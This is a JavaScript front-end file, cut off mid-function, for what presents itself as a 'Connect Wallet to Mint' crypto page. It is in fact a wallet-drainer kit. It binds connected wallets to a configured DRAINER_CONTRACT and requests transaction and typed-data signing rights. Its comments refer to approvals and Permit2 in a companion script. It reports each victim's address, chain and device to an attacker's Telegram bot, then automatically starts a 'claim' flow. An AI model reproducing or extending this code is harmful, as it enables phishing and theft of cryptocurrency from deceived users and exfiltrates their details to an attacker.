import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ============================================================
  //  DEBUG PANEL (unchanged)
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ============================================================
  //  DEVICE DETECTION (unchanged)
  // ============================================================
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const isAndroid = () => /Android/i.test(navigator.userAgent);
  const isDesktop = () => !isMobile();
  const isWindows = () => /Windows/i.test(navigator.userAgent);
  const isMac     = () => /Macintosh|Mac OS X/i.test(navigator.userAgent);

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ============================================================
  //  CONFIG (destructure once)
  // ============================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  let projectId = PROJECT_ID;
  const FALLBACK_ID = (PUBLIC_TEST_ID && PUBLIC_TEST_ID !== PROJECT_ID) ? PUBLIC_TEST_ID : null;

  // ============================================================
  //  TELEGRAM
  // ============================================================
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ============================================================
  //  WEBSOCKET CHECK – reduced timeout (unchanged)
  // ============================================================
  async function checkWebSocket(retries = 2, delay = 500) {
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i + 1}/${retries}`);
        const result = await new Promise((resolve) => {
          let ws;
          try { ws = new WebSocket('wss://relay.walletconnect.com'); }
          catch { return resolve(false); }
          const timeout = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, 2000);
          ws.onopen  = () => { clearTimeout(timeout); try { ws.close(); } catch {} resolve(true); };
          ws.onerror = () => { clearTimeout(timeout); try { ws.close(); } catch {} resolve(false); };
        });
        if (result) { logDebug('✅ WebSocket connection successful'); return true; }
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) {
        logDebug(`WebSocket exception: ${e.message}`);
        await new Promise((r) => setTimeout(r, delay));
      }
    }
    logDebug('❌ WebSocket connection failed after retries');
    return false;
  }

  // ============================================================
  //  DYNAMIC LIBRARY LOADING – SignClient + Modal + EthereumProvider
  // ============================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0?bundle',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SignClient, WalletConnectModal, EthereumProvider;
    for (const url of cdns) {
      try {
        logDebug(`Trying SignClient from ${url}`);
        const mod = await import(url);
        SignClient = mod.default || mod;
        logDebug(`✅ SignClient loaded from ${url}`);
        break;
      } catch (e) { logDebug(`❌ SignClient @ ${url}: ${e.message}`); }
    }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      try {
        logDebug(`Trying WalletConnectModal from ${url}`);
        const mod = await import(url);
        WalletConnectModal = mod.WalletConnectModal || mod.default || mod;
        logDebug(`✅ WalletConnectModal loaded from ${url}`);
        break;
      } catch (e) { logDebug(`❌ Modal @ ${url}: ${e.message}`); }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      try {
        logDebug(`Trying EthereumProvider from ${url}`);
        const mod = await import(url);
        EthereumProvider = mod.EthereumProvider || mod.default || mod;
        logDebug(`✅ EthereumProvider loaded from ${url}`);
        break;
      } catch (e) { logDebug(`❌ EthereumProvider @ ${url}: ${e.message}`); }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ============================================================
  //  DOM REFERENCES
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ============================================================
  //  STATE
  // ============================================================
  let currentSession = null;
  let client, modal, SignClient, WalletConnectModal, EthereumProvider;
  /** WC EIP-1193 provider — used for actual signing. This is what fixes
   *  the "Trust Wallet shows connected but site doesn't" issue. */
  let wcEthereumProvider = null;
  /** Injected provider — window.ethereum when on desktop or in-wallet browser. */
  let injectedProvider = null;
  /** Whichever provider is currently live. Published to script.js. */
  let activeProvider = null;
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let connectionMode = null; // 'walletconnect' | 'injected' | 'solana' | 'bitcoin' | null

  // ============================================================
  //  UI STATE MANAGEMENT (unchanged)
  // ============================================================
  function setButtonState(button, state, message = '') {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  //  STORAGE — dual-write so BOTH main.js and script.js see it
  //  script.js reads: connectedAddress + connectedWalletType
  //  main.js reads:   connectedWallet + chainType + walletConnectSession
  // ============================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      localStorage.setItem('connectedAddress', address); // script.js
      if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
      if (chainType) {
        localStorage.setItem('chainType', chainType);
        localStorage.setItem('connectedWalletType', chainType); // script.js
      } else {
        const detected = getChainType();
        if (detected !== 'unknown') {
          localStorage.setItem('chainType', detected);
          localStorage.setItem('connectedWalletType', detected);
        }
      }
    } catch (e) { logDebug('saveWallet: ' + e.message); }
  }
  function getSavedWallet()    { return localStorage.getItem('connectedWallet') || localStorage.getItem('connectedAddress'); }
  function getSavedSession()   {
    const s = localStorage.getItem('walletConnectSession');
    try { return s ? JSON.parse(s) : null; } catch { return null; }
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || localStorage.getItem('connectedWalletType') || 'unknown'; }
  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
      localStorage.removeItem('connectedAddress');
      localStorage.removeItem('connectedWalletType');
    } catch {}
  }

  // ============================================================
  //  CHAIN DETECTION
  // ============================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ============================================================
  //  PUBLISH GLOBAL — the contract with script.js
  //  script.js reads: window.__apexConnected = { address, chain, web3,
  //  contract, provider }  and listens for 'apex:connected'
  // ============================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,               // <-- live EIP-1193 provider for signing
      mode: connectionMode,
      session: currentSession || null,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} chain=${chain} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ============================================================
  //  UI UPDATE WITH CHAIN BADGE
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    const copyBtn = document.getElementById('copyAddress');
    if (copyBtn) {
      copyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(address).then(() => {
          const orig = copyBtn.innerHTML;
          copyBtn.innerHTML = '<i class="fas fa-check"></i>';
          copyBtn.style.color = '#10B981';
          setTimeout(() => { copyBtn.innerHTML = orig; copyBtn.style.color = '#059669'; }, 2000);
        });
      });
    }

    showStatus(`Connected to ${chainLabel}`, 'success');

    // Publish global + fire event for script.js
    publishGlobalState(address, chain);

    // Telegram report
    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());

    // Kick script.js's claim flow (same as old flow, but now guarded)
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1500);
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    wcEthereumProvider = null;
    injectedProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ============================================================
  //  SOLANA WALLET DETECTION (unchanged)
  // ============================================================
  const solanaWalletDetectors = {
    isPhantom:        () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare:       () => !!window.solflare,
    isBackpack:       () => !!window.backpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana:    () => !!(window.trustWallet?.solana),
  };

  function getSolanaWallets() {
    const wallets = [];
    if (solanaWalletDetectors.isPhantom())        wallets.push({ name: 'Phantom',  provider: window.phantom?.solana || window.solana });
    if (solanaWalletDetectors.isSolflare())       wallets.push({ name: 'Solflare', provider: window.solflare });
    if (solanaWalletDetectors.isBackpack())       wallets.push({ name: 'Backpack', provider: window.backpack });
    if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (solanaWalletDetectors.isTrustSolana())    wallets.push({ name: 'Trust',    provider: window.trustWallet.solana });
    return wallets;
  }

  // ============================================================
  //  EIP‑6963: DETECT ALL EVM PROVIDERS (unchanged)
  // ============================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail;
      if (!evmProviders.some((p) => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP‑6963: Found provider ${detail.info.name} (${detail.info.rdns})`);
      }
    });

    const fire = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    fire();
    setTimeout(fire, 500);
    setTimeout(fire, 1500);
  }

  // ============================================================
  //  WALLET SELECTION MODAL (unchanged)
  // ============================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout  = () => btn.style.background = '#374151';
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => { overlay.remove(); callback(provider); });
      list.appendChild(btn);
    });

    modalEl.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  // ============================================================
  //  WALLETCONNECT INITIALIZATION – singleton
  //  SignClient + Modal are used ONLY for the QR/URI UI.
  //  Actual connect + signing is done by EthereumProvider (see below).
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId && FALLBACK_ID) {
      logDebug('🔄 Initializing with PUBLIC TEST project ID');
      projectId = FALLBACK_ID;
    } else {
      logDebug(`🔄 Initializing with projectId: ${String(projectId).slice(0, 8)}…`);
    }

    const wsOk = await checkWebSocket(2, 500);
    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway');

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask',        links: { native: 'metamask://',        universal: 'https://metamask.app.link/' } },
          { id: 'trust',    name: 'Trust Wallet',    links: { native: 'trust://',           universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow',  name: 'Rainbow',         links: { native: 'rainbow://',         universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://',  universal: 'https://go.cb-w.com/' } },
        ],
      });
      logDebug('✅ WalletConnect initialized successfully');
      return true;
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`);
      return false;
    }
  }

  // ============================================================
  //  DIRECT EVM CONNECTION (PC / desktop)  — unchanged
  // ============================================================
  async function connectDirectEVM(timeoutMs = 4000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 300));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) {
      logDebug('No EVM providers found');
      return false;
    }

    let chosenProvider = null;
    if (providers.length === 1) {
      chosenProvider = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      if (known) chosenProvider = known;
      else {
        const result = await new Promise((resolve) => {
          showWalletSelectionModal(providers, (selected) => resolve(selected));
        });
        if (!result) return false;
        chosenProvider = result;
      }
    }

    try {
      logDebug(`Direct EVM: attempting with ${chosenProvider.info.name} (timeout ${timeoutMs}ms)`);
      const provider = chosenProvider.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), timeoutMs)),
      ]);

      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        logDebug(`✅ Direct EVM via ${chosenProvider.info.name}: ${address}`);

        injectedProvider = provider;
        activeProvider = provider;
        connectionMode = 'injected';

        saveWallet(address, null, 'evm');
        setupEVMProviderEvents(provider);

        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

        updateConnectedUI(address, 'evm');
        return true;
      }
    } catch (err) {
      logDebug(`Direct EVM error: ${err.message}`);
      if (err.message === 'Connection timeout') logDebug('Direct EVM timed out, will fallback');
      if (err.code === 4001) logDebug('User rejected direct connection');
      return false;
    }
    return false;
  }

  // ============================================================
  //  WALLETCONNECT EVM CONNECTION
  //  Same UI flow as old (SignClient → modal → approval),
  //  but the SIGNING provider is a fresh EthereumProvider.init({session})
  //  so `provider.request({method:'eth_sendTransaction'})` actually works.
  // ============================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 10000) {
    if (isConnecting) { logDebug('Already connecting, please wait'); return false; }
    isConnecting = true;

    const initSuccess = await initWalletConnect(useTestId);
    if (!initSuccess) {
      isConnecting = false;
      showStatus('Wallet connection service unavailable', 'error');
      return false;
    }

    if (modal && modal.closeModal) {
      try { modal.closeModal(); } catch (e) {}
    }

    try {
      showStatus('Requesting wallet connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: [`eip155:${MAINNET_ID}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (uri) {
        logDebug(`URI: ${uri.slice(0, 64)}…`);
        modal.openModal({ uri });
        showStatus('Select your wallet or scan QR code', 'info');
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
      }

      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), timeoutMs)),
      ]);

      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        showStatus('No accounts found', 'error');
        isConnecting = false;
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      logDebug(`✅ WalletConnect session: ${account}`);
      currentSession = session;

      // === THE FIX ===
      // Build a live signing provider from the approved session. This is the
      // exact provider script.js will use for approvals + Permit2. No more
      // "wallet says connected but site doesn't" — the provider actually
      // holds the session.
      let signProvider = null;
      try {
        signProvider = await EthereumProvider.init({
          projectId,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: false,
          metadata: DAPP_METADATA,
          session,                       // <-- rehydrates from approved session
          rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
        });
        logDebug('✅ EthereumProvider initialized from session');
      } catch (e) {
        logDebug(`⚠️ EthereumProvider.init({session}) failed: ${e.message}`);
        signProvider = null;
      }

      if (!signProvider) {
        showStatus('Failed to bind signing provider', 'error');
        isConnecting = false;
        return false;
      }

      wcEthereumProvider = signProvider;
      activeProvider = signProvider;
      connectionMode = 'walletconnect';

      saveWallet(account, session, 'evm');

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(signProvider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      attachWCProviderEvents(signProvider);
      attachClientSessionEvents();

      updateConnectedUI(account, 'evm');
      isConnecting = false;
      return true;
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`);
      if (modal) { try { modal.closeModal(); } catch {} }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error');
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please try again', 'error');
      } else {
        showStatus('Wallet connection failed', 'error');
      }
      isConnecting = false;
      return false;
    }
  }

  // ============================================================
  //  WC PROVIDER EVENT WIRING (attached once per provider)
  // ============================================================
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Grace period — some wallets briefly emit [] during connect
        setTimeout(async () => {
          try {
            const again = provider.accounts || (await provider.request({ method: 'eth_accounts' }));
            if (!again || again.length === 0) {
              resetConnectedUI();
              clearSavedWallet();
            }
          } catch {
            resetConnectedUI();
            clearSavedWallet();
          }
        }, 600);
        return;
      }
      const a = accounts[0];
      saveWallet(a, provider.session || currentSession, 'evm');
      updateConnectedUI(a, 'evm');
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ============================================================
  //  SIGNCLIENT SESSION EVENTS (mirror into our state + script.js)
  // ============================================================
  let clientEventsAttached = false;
  function attachClientSessionEvents() {
    if (!client || clientEventsAttached) return;
    clientEventsAttached = true;

    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const account = accounts[0].split(':')[2];
        updateConnectedUI(account, 'evm');
        saveWallet(account, currentSession, 'evm');
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected by provider', 'error');
    });

    client.on('session_connect', (session) => {
      const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (account) {
        currentSession = session;
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm');
      }
    });
  }

  // ============================================================
  //  BITCOIN (UniSat) – Desktop only  (unchanged)
  // ============================================================
  async function connectBitcoin() {
    try {
      if (!window.unisat) { showStatus('UniSat wallet not installed', 'error'); return false; }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts || accounts.length === 0) throw new Error('No BTC account');
      const address = accounts[0];
      connectionMode = 'bitcoin';
      activeProvider = null;
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');

      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (newAccounts.length === 0) {
            resetConnectedUI();
            clearSavedWallet();
          } else {
            saveWallet(newAccounts[0], null, 'bitcoin');
            updateConnectedUI(newAccounts[0], 'bitcoin');
          }
        });
        window.unisat.on('networkChanged', (network) => {
          showStatus(`Bitcoin network changed to ${network}`, 'info');
        });
      }
      return true;
    } catch (e) {
      logDebug(`BTC connection error: ${e.message}`);
      showStatus('Bitcoin connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ============================================================
  //  SOLANA – Desktop only  (unchanged)
  // ============================================================
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (wallets.length === 0) { showStatus('No Solana wallet found (Phantom, Solflare, etc.)', 'error'); return false; }
      const wallet = wallets[0];
      const provider = wallet.provider;

      let publicKey;
      if (provider.connect) {
        const response = await provider.connect();
        publicKey = response.publicKey?.toString() || response.toString();
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' });
        publicKey = response.publicKey.toString();
      } else {
        throw new Error('Unsupported provider interface');
      }

      const address = publicKey;
      connectionMode = 'solana';
      activeProvider = null;
      saveWallet(address, null, 'solana');
      updateConnectedUI(address, 'solana');

      window.solanaProvider = provider;
      window.solanaPublicKey = address;

      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString();
            saveWallet(addr, null, 'solana');
            updateConnectedUI(addr, 'solana');
            window.solanaPublicKey = addr;
          } else {
